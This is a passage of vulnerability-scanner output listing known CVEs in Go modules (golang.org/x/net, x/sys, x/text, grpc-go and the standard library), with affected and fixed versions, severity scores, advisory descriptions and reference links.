                        │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:41030 
                        │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:41031 
                        │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:41036 
                        │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:41055 
                        │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:41066 
                        │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:41928 
                        │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:41930 
                        │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:42043 
                        │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:42047 
                        │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:42048 
                        │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:42049 
                        │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:42050 
                        │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:42051 
                        │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:42078 
                        │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:42079 
                        │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:42080 
                        │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:42082 
                        │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:42132 
                        │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:42142 
                        │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:42146 
                        │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:42150 
                        │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:42151 
                        │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:42240 
                        │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:42644 
                        │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:42796 
                        │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:42852 
                        │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:43038 
                        │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:43052 
                        │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:43692 
                        │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:44622 
                        │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:44624 
                        │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:46395 
                        │      │                  ├ [82] : https://access.redhat.com/errata/RHSA-2026:47149 
                        │      │                  ├ [83] : https://access.redhat.com/errata/RHSA-2026:47735 
                        │      │                  ├ [84] : https://access.redhat.com/errata/RHSA-2026:47737 
                        │      │                  ├ [85] : https://access.redhat.com/security/cve/CVE-2026-39821 
                        │      │                  ├ [86] : https://bugzilla.redhat.com/2480756 
                        │      │                  ├ [87] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
                        │      │                  ├ [88] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
                        │      │                  ├ [89] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
                        │      │                  │        026-27145 
                        │      │                  ├ [90] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
                        │      │                  │        026-39821 
                        │      │                  ├ [91] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
                        │      │                  ├ [92] : https://errata.rockylinux.org/RLSA-2026:46395 
                        │      │                  ├ [93] : https://github.com/golang/go/issues/78760 
                        │      │                  ├ [94] : https://go.dev/cl/767220 
                        │      │                  ├ [95] : https://go.dev/issue/78760 
                        │      │                  ├ [96] : https://groups.google.com/g/golang-announce/c/iI-mYS
                        │      │                  │        I0lu8 
                        │      │                  ├ [97] : https://linux.oracle.com/cve/CVE-2026-39821.html 
                        │      │                  ├ [98] : https://linux.oracle.com/errata/ELSA-2026-46395.html 
                        │      │                  ├ [99] : https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
                        │      │                  ├ [100]: https://pkg.go.dev/vuln/GO-2026-5026 
                        │      │                  ├ [101]: https://security.access.redhat.com/data/csaf/v2/vex/
                        │      │                  │        2026/cve-2026-39821.json 
                        │      │                  ├ [102]: https://ubuntu.com/security/notices/USN-8416-1 
                        │      │                  ╰ [103]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
                        │      ╰ LastModifiedDate: 2026-07-29T13:18:20.72Z 
                        ├ [4]  ╭ VulnerabilityID : CVE-2026-25680 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5028 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:41d16bd451503816fc4742b8f7a407b28db80f2f73535e1a09f50
                        │      │                   79b671d8372 
                        │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of
                        │      │                   Service due to excessive HTML parsing 
                        │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time,
                        │      │                   possibly leading to denial of service. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-400 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ azure : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N
                        │      │                           │           /A:H 
                        │      │                           ╰ V3Score : 6.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-25680 
                        │      │                  ├ [1]: https://go.dev/cl/781702 
                        │      │                  ├ [2]: https://go.dev/issue/79573 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0
                        │      │                  │      lu8 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-25680 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5028 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-25680 
                        │      ├ PublishedDate   : 2026-05-22T16:16:19.753Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [5]  ╭ VulnerabilityID : CVE-2026-42502 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5027 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:f4b8adf49bc6bc5f7e210082026c70e84d0ba957d2daf33093985
                        │      │                   fe0de98030f 
                        │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html:
                        │      │                   Cross-Site Scripting via unexpected HTML tree rendering 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-1021 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ azure : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 6.1 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42502 
                        │      │                  ├ [1]: https://go.dev/cl/781701 
                        │      │                  ├ [2]: https://go.dev/issue/79572 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0
                        │      │                  │      lu8 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42502 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5027 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42502 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.587Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [6]  ╭ VulnerabilityID : CVE-2026-42506 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5025 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.55.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:afd4fda8cf926367cb865fc9d5adcffe8cbcd7fe0fd4bb6d284a2
                        │      │                   f1e105c99a3 
                        │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site
                        │      │                   Scripting (XSS) via arbitrary HTML parsing 
                        │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render
                        │      │                   can result in an unexpected HTML tree. This can be leveraged
                        │      │                    to execute XSS attacks in applications that attempt to
                        │      │                   sanitize input HTML before rendering. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-79 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ azure : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 5.4 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42506 
                        │      │                  ├ [1]: https://go.dev/cl/781700 
                        │      │                  ├ [2]: https://go.dev/issue/79571 
                        │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0
                        │      │                  │      lu8 
                        │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42506 
                        │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5025 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42506 
                        │      ├ PublishedDate   : 2026-05-22T16:16:20.803Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [7]  ╭ VulnerabilityID : CVE-2026-46600 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5942 
                        │      ├ PkgID           : golang.org/x/net@v0.49.0 
                        │      ├ PkgName         : golang.org/x/net 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.49.0 
                        │      │                  ╰ UID : d9a61092434f99e5 
                        │      ├ InstalledVersion: v0.49.0 
                        │      ├ FixedVersion    : 0.56.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:23605cc69cbfc37c64fc091b882403a3c0b091e490a98a9045a38
                        │      │                   929e749129d 
                        │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
                        │      │                   of a param ... 
                        │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
                        │      │                   of a parameter value overflows the message buffer. 
                        │      ├ Severity        : UNKNOWN 
                        │      ├ CweIDs           ─ [0]: CWE-125 
                        │      ├ References       ╭ [0]: https://go.dev/cl/786345 
                        │      │                  ├ [1]: https://go.dev/issue/79795 
                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
                        │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
                        │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
                        ├ [8]  ╭ VulnerabilityID : CVE-2026-39824 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5024 
                        │      ├ PkgID           : golang.org/x/sys@v0.42.0 
                        │      ├ PkgName         : golang.org/x/sys 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/sys@v0.42.0 
                        │      │                  ╰ UID : 9dd104bb9b94dda4 
                        │      ├ InstalledVersion: v0.42.0 
                        │      ├ FixedVersion    : 0.44.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:3aead4dfec7748cb565a7d0523ac3511076946a8d55c2526707e8
                        │      │                   350defea0fc 
                        │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in
                        │      │                   golang.org/x/sys/windows 
                        │      ├ Description     : NewNTUnicodeString does not check for string length
                        │      │                   overflow. When provided with a string that overflows the
                        │      │                   maximum size of a NTUnicodeString (a 16-bit number of
                        │      │                   bytes), it returns a truncated string rather than an
                        │      │                   error. 
                        │      ├ Severity        : UNKNOWN 
                        │      ├ CweIDs           ─ [0]: CWE-190 
                        │      ├ References       ╭ [0]: https://go.dev/cl/770080 
                        │      │                  ├ [1]: https://go.dev/issue/78916 
                        │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/6MMI8Lj-
                        │      │                  │      Atg 
                        │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5024 
                        │      ├ PublishedDate   : 2026-05-22T20:16:33.057Z 
                        │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
                        ├ [9]  ╭ VulnerabilityID : CVE-2026-56852 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5970 
                        │      ├ PkgID           : golang.org/x/text@v0.33.0 
                        │      ├ PkgName         : golang.org/x/text 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.33.0 
                        │      │                  ╰ UID : 1d58fdff500f9aea 
                        │      ├ InstalledVersion: v0.33.0 
                        │      ├ FixedVersion    : 0.39.0 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:3928224ad9ce21e411a7e65746909b65a6569afa68e637c29b42c
                        │      │                   a601a614e9e 
                        │      ├ Title           : A norm.Iter can enter an infinite loop when handling input
                        │      │                   containing  ... 
                        │      ├ Description     : A norm.Iter can enter an infinite loop when handling input
                        │      │                   containing invalid UTF-8 bytes. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-835 
                        │      ├ VendorSeverity   ─ azure: 3 
                        │      ├ References       ╭ [0]: https://go.dev/cl/794100 
                        │      │                  ├ [1]: https://go.dev/issue/80142 
                        │      │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
                        │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
                        │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
                        │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
                        ├ [10] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
                        │      ├ PkgID           : google.golang.org/grpc@v1.79.3 
                        │      ├ PkgName         : google.golang.org/grpc 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.79.3 
                        │      │                  ╰ UID : f8603e27ab63e541 
                        │      ├ InstalledVersion: v1.79.3 
                        │      ├ FixedVersion    : 1.82.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Go 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Ago 
                        │      ├ Fingerprint     : sha256:263140194719573ac1a88f462a4d057d140a4004ae1730a8a2a22
                        │      │                   e970dc44372 
                        │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
                        │      ├ Description     : Multiple security vulnerabilities have been identified and
                        │      │                   addressed in grpc-go affecting the xDS RBAC authorization
                        │      │                   engine (internal/xds/rbac) and the HTTP/2 transport server
                        │      │                   implementation (internal/transport). These vulnerabilities
                        │      │                   could result in:
                        │      │                   
                        │      │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
                        │      │                    policies containing `Metadata` or `RequestedServerName`
                        │      │                   fields.
                        │      │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
                        │      │                   Rapid Reset mitigation bypass during client-initiated stream
                        │      │                    resets.
                        │      │                   - Denial of Service (Server Panic) when parsing crafted xDS
                        │      │                   RBAC policies containing `NOT` rules around unsupported
                        │      │                   ### Impact
                        │      │                   _What kind of vulnerability is it? Who is impacted?_
                        │      │                   #### xDS RBAC Authorization Bypass via `Metadata` &
                        │      │                   `RequestedServerName` matchers
                        │      │                   - Affected Component: xDS RBAC 
                        │      │                   - Impact: When building policy matchers for gRPC RBAC from
                        │      │                   xDS configurations, unsupported `permission` and `principal`
                        │      │                    rules (specifically `Metadata` and `RequestedServerName`)
                        │      │                   were silently ignored and treated as no-ops.
                        │      │                     - If an authorization policy relied purely on these
                        │      │                   matchers for access control, treating those rules as no-ops
                        │      │                   effectively removed the restrictions.
                        │      │                   - If these unsupported rules were nested inside logical
                        │      │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
                        │      │                   multi-condition `OR/AND` rules, silently dropping them
                        │      │                   changed the boolean logic flow of the authorization engine.
                        │      │                   As a result, policy evaluation decisions could fail open,
                        │      │                   allowing unauthorized clients to access protected gRPC
                        │      │                   services or resources.
                        │      │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
                        │      │                   Service via Stream Aborts
                        │      │                   - Affected Component: HTTP/2 transport
                        │      │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
                        │      │                   Reset only applied threshold checks to items that directly
                        │      │                   resulted in control frames being written back to the wire,
                        │      │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
                        │      │                   When a client initiated a rapid flood of stream creation
                        │      │                   (`HEADERS`) immediately followed by stream termination
                        │      │                   `RST_STREAM`, items queued up in the control buffer without
                        │      │                   counting against the transport response frame threshold. An
                        │      │                   attacker can repeatedly trigger this flood sequence to
                        │      │                   bypass reader blocking, resulting in high CPU usage, and
                        │      │                   Denial of Service (DoS).
                        │      │                   #### Denial of Service (Panic) in xDS RBAC Engine via
                        │      │                   Unsupported Fields inside NOT Rules
                        │      │                   - Impact: The xDS RBAC policy translators recursively
                        │      │                   generate matchers for nested rules. When a `NOT` rule
                        │      │                   wrapped an unsupported or unhandled field (such as
                        │      │                   `SourcedMetadata`), the recursive step returned an empty
                        │      │                   matcher. This could result in a runtime panic when the RBAC
                        │      │                   engine attempts to authorize an incoming request.
                        │      │                   An attacker or misconfigured/malicious xDS management server
                        │      │                    delivering an LDS/RDS update containing a `NOT` rule around
                        │      │                    an unhandled field causes the gRPC server process to crash
                        │      │                   immediately (CWE-248 / Denial of Service).
                        │      │                   ### Patches
                        │      │                   _Has the problem been patched? What versions should users
                        │      │                   upgrade to?_
                        │      │                   All three issues have been fixed in `master` and will be
                        │      │                   released in 1.82.1 shortly.
                        │      │                   ### Workarounds
                        │      │                   _Is there a way for users to fix or remediate the
                        │      │                   vulnerability without upgrading?_
                        │      │                   If upgrading grpc-go immediately is not possible, apply the
                        │      │                   following workarounds based on your deployment
                        │      │                   architecture:
                        │      │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
                        │      │                   upstream xDS management servers do not push RBAC policies
                        │      │                   containing `Metadata`, `RequestedServerName`, or `NOT` rules
                        │      │                    wrapping unsupported fields (such as `SourcedMetadata`) to
                        │      │                   grpc-go servers.
                        │      │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
                        │      │                   proxies or load balancers (such as Envoy) with strict HTTP/2
                        │      │                    `max_concurrent_streams` limits and active rate limiting on
                        │      │                    `RST_STREAM` frequency per connection.
                        │      │                   ### Severity
                        │      │                     | Vulnerability | Qualitative Severity | Approximate CVSS
                        │      │                   v3.1 Score | Primary Impact |
                        │      │                     | :--- | :--- | :--- | :--- |
                        │      │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
                        │      │                   Unauthorized Access / Fail-Open |
                        │      │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
                        │      │                   High CPU Consumption / Denial of Service |
                        │      │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
                        │      │                   Process Crash / Denial of Service | 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :H/VA:H/SC:N/SI:N/SA:N 
                        │      │                         ╰ V40Score : 8.8 
                        │      ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
                        │      │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013
                        │      │                  │      f72a142fe0fc89c19770b2935 
                        │      │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
                        │      │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
                        │      │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GH
                        │      │                         SA-hrxh-6v49-42gf 
                        │      ├ PublishedDate   : 2026-07-21T22:03:55Z 
                        │      ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
                        ├ [11] ╭ VulnerabilityID : CVE-2026-27145 
                        │      ├ VendorIDs        ─ [0]: GO-2026-5037 
                        │      ├ PkgID           : stdlib@v1.26.3 
                        │      ├ PkgName         : stdlib 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
                        │      │                  ╰ UID : 9770e92adf1be71b 
                        │      ├ InstalledVersion: v1.26.3 
                        │      ├ FixedVersion    : 1.25.11, 1.26.4 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300
                        │      │                  │         c6997c001601e2a6e5af 
                        │      │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a17
                        │      │                            2e154f0b8ad928e980c9 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
                        │      ├ DataSource       ╭ ID  : govulndb 
                        │      │                  ├ Name: The Go Vulnerability Database 
                        │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                        │      ├ Fingerprint     : sha256:cdeb75d07ecd7c5d5a4f141287731ae11c0d3419413f32c80da07
                        │      │                   622744f459f 
                        │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service
                        │      │                   via excessive processing of DNS SAN entries 
                        │      ├ Description     : (*x509.Certificate).VerifyHostname previously called
                        │      │                   matchHostnames in a loop over all DNS Subject Alternative
                        │      │                   Name (SAN) entries. This caused strings.Split(host, ".") to
                        │      │                   execute repeatedly on the same input hostname. With a large
                        │      │                   DNS SAN list, verification costs scaled quadratically based
                        │      │                   on the number of SAN entries multiplied by the hostname's
                        │      │                   label count. Because x509.Verify validates hostnames before
                        │      │                   building the certificate chain, this overhead occurred even
                        │      │                   for untrusted certificates. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-606 
                        │      ├ VendorSeverity   ╭ alma       : 3 
                        │      │                  ├ amazon     : 2 
                        │      │                  ├ bitnami    : 2 
                        │      │                  ├ oracle-oval: 3 
                        │      │                  ├ redhat     : 3 
                        │      │                  ╰ rocky      : 3 
                        │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:
                        │      │                  │         │           L/A:H 
                        │      │                  │         ╰ V3Score : 6.5 
                        │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:
                        │      │                            │           N/A:H 
                        │      │                            ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
                        │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29981 
                        │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33574 
                        │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:34357 
                        │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34359 
                        │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:35832 
                        │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36317 
                        │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36648 
                        │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
                        │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:38995 
                        │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:39005 
                        │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39573 
                        │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39879 
                        │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41030 
                        │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41036 
                        │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41930 
                        │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42043 
                        │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42047 
                        │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42049 
                        │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42050 
                        │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42051 
                        │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42079 
                        │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42080 
                        │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42082 
                        │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42142 
                        │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42150 
                        │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42151 
